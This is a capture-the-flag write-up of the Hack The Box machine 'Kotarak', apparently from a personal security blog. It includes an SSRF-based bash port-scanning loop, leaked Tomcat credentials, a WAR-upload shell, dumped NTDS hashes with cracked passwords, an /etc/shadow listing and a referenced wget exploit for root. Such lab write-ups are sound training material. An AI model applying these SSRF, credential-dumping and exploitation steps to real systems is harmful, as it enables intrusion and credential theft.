Title: HTB Kotarak writeup
Tags: oscp, htb, wget, custom enum
Summary: Kind of convoluted or CTF-ey box
Date: 2020-09-24 21:30
Status: published

# Enumeration
Starting with full TCP range scan as always here:
```text
    Nmap 7.80 scan initiated Thu Sep 24 11:05:54 2020 as: nmap -sS -p- -oA enum/nmap-ss-all kotarak.htb
    Nmap scan report for kotarak.htb (10.10.10.55)
    Host is up (0.059s latency).
    Not shown: 65531 closed ports
    PORT      STATE SERVICE
    22/tcp    open  ssh
    8009/tcp  open  ajp13
    8080/tcp  open  http-proxy
    60000/tcp open  unknown
    Nmap done at Thu Sep 24 11:06:40 2020 -- 1 IP address (1 host up) scanned in 49.18 seconds
```

Continue with scripted scan:
```text
    Nmap 7.80 scan initiated Thu Sep 24 11:08:45 2020 as: nmap -sC -A -T4 -p22,8009,8080,60000 -oA enum/nmap-sCAT4-open kotarak.htb
    Nmap scan report for kotarak.htb (10.10.10.55)
    Host is up (0.058s latency).
    PORT      STATE SERVICE VERSION
    22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
    |   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
    |_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
    8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
    | ajp-methods: 
    |   Supported methods: GET HEAD POST PUT DELETE OPTIONS
    |   Potentially risky methods: PUT DELETE
    |_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
    8080/tcp  open  http    Apache Tomcat 8.5.5
    |_http-favicon: Apache Tomcat
    | http-methods: 
    |_  Potentially risky methods: PUT DELETE
    |_http-title: Apache Tomcat/8.5.5 - Error report
    60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title:         Kotarak Web Hosting        
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), Linux 4.2 (95%), Linux 4.8 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    TRACEROUTE (using port 22/tcp)
    HOP RTT      ADDRESS
    1   57.30 ms 10.10.14.1
    2   57.38 ms kotarak.htb (10.10.10.55)
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done at Thu Sep 24 11:09:43 2020 -- 1 IP address (1 host up) scanned in 57.80 seconds
```
Something unusual hosted on TCP 60000:

![kotarak web app 60000](/cstatic/htb-kotarak/kotarak-60000-web.png)

This web app allows us to enumerate local services that do not exposed over the network, for example
that listening only on `127.0.0.1`. A little bash script composed to enumerate some:
```bash
#!/bin/bash

for i in {1..65535};
do
    len=$(curl -s http://10.10.10.55:60000/url.php?path=127.0.0.1:$i | wc -c)
    if [[ len -gt 2 ]];
    then
        printf 'TCP %i\tLEN = %i\n' $i $len
    fi
done
```

Some local services discovered:
```text
TCP 22  LEN = 62
TCP 90  LEN = 156
TCP 110 LEN = 187
TCP 200 LEN = 22
TCP 320 LEN = 1232
TCP 888 LEN = 3955
TCP 3306 LEN = 123
TCP 8080 LEN = 994
```

Since app on 60000 likely respond with HTTP 200 on any request, I tried to enumerate services filtering responses by the length. Below are some results.
`127.0.0.1:90`:
```text
    /lost+found (Status: 200) [Size: 303]
    /server-status (Status: 200) [Size: 8679]
```
Server status available:

![server-status at TCP 90](/cstatic/htb-kotarak/90-server-status.png)

The same for services on 110, 200, 320. 
Slightly different picture at 888:
```text
    /inc (Status: 200) [Size: 311]
    /lost+found (Status: 200) [Size: 304]
    /server-status (Status: 200) [Size: 8779]
```
Something interesting is here, we are able to list some files
through this and there are some credentials (`admin:3@g01PdhB!`) in `http://10.10.10.55:60000/url.php?path=127.0.0.1:888/?doc=backup`:

![backup creds](/cstatic/htb-kotarak/backup-passwd.png)

# Exploitation
Those creds allow to authenticate in tomcat manager page at `http://10.10.10.55:8080/manager/html`.
We are able to deploy our own apps in WAR format. Got interactive shell as `tomcat` user:

![tomcat shell](/cstatic/htb-kotarak/tomcat-shell.png)

There are some NTDS dumps within `/home/tomcat`:

![ntds location](/cstatic/htb-kotarak/ntds-location.png)

NTDS.dit should contain Active Directory credentials and usually stored on
domain controller, these files looks like dumped from somewhere else. Impacket's
`secretsdump.py` script allows to list hashes contained within:

![ntds dumped](/cstatic/htb-kotarak/ntds-dump.png)

Notice that there are hashes for `atanas` user, user with the same name present
on the kotarak box. Worth trying to crack these hashes:
```text
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
    WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
    WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
    WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
    WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
    atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
    Administrator:aes256-cts-hmac-sha1-96:6c53b16d11a496d0535959885ea7c79c04945889028704e2a4d1ca171e4374e2
    Administrator:aes128-cts-hmac-sha1-96:e2a25474aa9eb0e1525d0f50233c0274
    Administrator:des-cbc-md5:75375eda54757c2f
    WIN-3G2B0H151AC$:aes256-cts-hmac-sha1-96:84e3d886fe1a81ed415d36f438c036715fd8c9e67edbd866519a2358f9897233
    WIN-3G2B0H151AC$:aes128-cts-hmac-sha1-96:e1a487ca8937b21268e8b3c41c0e4a74
    WIN-3G2B0H151AC$:des-cbc-md5:b39dc12a920457d5
    WIN-3G2B0H151AC$:rc4_hmac:668d49ebfdb70aeee8bcaeac9e3e66fd
    krbtgt:aes256-cts-hmac-sha1-96:14134e1da577c7162acb1e01ea750a9da9b9b717f78d7ca6a5c95febe09b35b8
    krbtgt:aes128-cts-hmac-sha1-96:8b96c9c8ea354109b951bfa3f3aa4593
    krbtgt:des-cbc-md5:10ef08047a862046
    krbtgt:rc4_hmac:ca1ccefcb525db49828fbb9d68298eee
    WIN2K8$:aes256-cts-hmac-sha1-96:289dd4c7e01818f179a977fd1e35c0d34b22456b1c8f844f34d11b63168637c5
    WIN2K8$:aes128-cts-hmac-sha1-96:deb0ee067658c075ea7eaef27a605908
    WIN2K8$:des-cbc-md5:d352a8d3a7a7380b
    WIN2K8$:rc4_hmac:160f6c1db2ce0994c19c46a349611487
    WINXP1$:aes256-cts-hmac-sha1-96:347a128a1f9a71de4c52b09d94ad374ac173bd644c20d5e76f31b85e43376d14
    WINXP1$:aes128-cts-hmac-sha1-96:0e4c937f9f35576756a6001b0af04ded
    WINXP1$:des-cbc-md5:984a40d5f4a815f2
    WINXP1$:rc4_hmac:6f5e87fd20d1d8753896f6c9cb316279
    WIN2K31$:aes256-cts-hmac-sha1-96:f486b86bda928707e327faf7c752cba5bd1fcb42c3483c404be0424f6a5c9f16
    WIN2K31$:aes128-cts-hmac-sha1-96:1aae3545508cfda2725c8f9832a1a734
    WIN2K31$:des-cbc-md5:4cbf2ad3c4f75b01
    WIN2K31$:rc4_hmac:cdd7a7f43d06b3a91705900a592f3772
    WIN7$:aes256-cts-hmac-sha1-96:b9921a50152944b5849c706b584f108f9b93127f259b179afc207d2b46de6f42
    WIN7$:aes128-cts-hmac-sha1-96:40207f6ef31d6f50065d2f2ddb61a9e7
    WIN7$:des-cbc-md5:89a1673723ad9180
    WIN7$:rc4_hmac:24473180acbcc5f7d2731abe05cfa88c
    atanas:aes256-cts-hmac-sha1-96:933a05beca1abd1a1a47d70b23122c55de2fedfc855d94d543152239dd840ce2
    atanas:aes128-cts-hmac-sha1-96:d1db0c62335c9ae2508ee1d23d6efca4
    atanas:des-cbc-md5:6b80e391f113542a
```

crackstation.net was able to crack some hashes:
```text
e64fe0f24ba2489c05e64354d74ebd11    NTLM    f16tomcat!
2b576acbe6bcfda7294d6bd18041b8fe    NTLM    Password123!
```

And `f16tomcat!` worked for `atanas` user:

![atanas shell](/cstatic/htb-kotarak/atanas-shell.png)

# Privilege escalation
User atanas is in `disk` group and hence could read any file on the system, for example
here's the `/etc/shadow`:
```text
    root:$6$drWeP5N5$k65A2JoUsMISRA04wVOoXFOJVU.k7qxgBrvOD23S4mo6/aRlbnJbUNhvxiXdOe6rdyuvnkZY1po.Ym3q6uYhL0:17368:0:99999:7:::
    daemon:*:17001:0:99999:7:::
    bin:*:17001:0:99999:7:::
    sys:*:17001:0:99999:7:::
    sync:*:17001:0:99999:7:::
    games:*:17001:0:99999:7:::
    man:*:17001:0:99999:7:::
    lp:*:17001:0:99999:7:::
    mail:*:17001:0:99999:7:::
    news:*:17001:0:99999:7:::
    uucp:*:17001:0:99999:7:::
    proxy:*:17001:0:99999:7:::
    www-data:*:17001:0:99999:7:::
    backup:*:17001:0:99999:7:::
    list:*:17001:0:99999:7:::
    irc:*:17001:0:99999:7:::
    gnats:*:17001:0:99999:7:::
    nobody:*:17001:0:99999:7:::
    systemd-timesync:*:17001:0:99999:7:::
    systemd-network:*:17001:0:99999:7:::
    systemd-resolve:*:17001:0:99999:7:::
    systemd-bus-proxy:*:17001:0:99999:7:::
    syslog:*:17001:0:99999:7:::
    _apt:*:17001:0:99999:7:::
    lxd:*:17356:0:99999:7:::
    messagebus:*:17356:0:99999:7:::
    uuidd:*:17356:0:99999:7:::
    dnsmasq:*:17356:0:99999:7:::
    atanas:$6$V7BERjjx$jYM7HrbrhsMcdFtVeA/BPkUJbYqFDdHUvf7Sefwo7ywQ9eyW0lKTCHiFt0WIJ1qtKEVbySfsks9RonNVUX2LD/:17368:0:99999:7:::
    tomcat:!:17359:0:99999:7:::
    mysql:!:17359:0:99999:7:::
    lxc-dnsmasq:!:17366:0:99999:7:::
    sshd:*:17368:0:99999:7:::
```
Unfortunately it seems that we couldn't write authorized SSH keys for root.
There's an interesting `app.log` file under `/root`:

![app.log](/cstatic/htb-kotarak/app-log.png)

And it seems that some cron job is repeatedly running wget every couple of minutes:

![cron wget](/cstatic/htb-kotarak/cron-wget.png)

Given these things, it might be useful to try to exploit 
[vulnerability](https://www.exploit-db.com/exploits/40064) in wget itself.
Changed a bit `.wgetrc` and exploit script so that extracted file set to `/root/root.txt`
and connection parameters pointing to my kali machine and got root flag extracted:

![root flag](/cstatic/htb-kotarak/root-flag.png)

The flag seems to be hosted within lxc container. There were some points that
was rabbit holes, such as membership in `disk` group. However, our own `authbind`
in `/usr/bin` suggested that the proper way to own root is to use wget exploit.
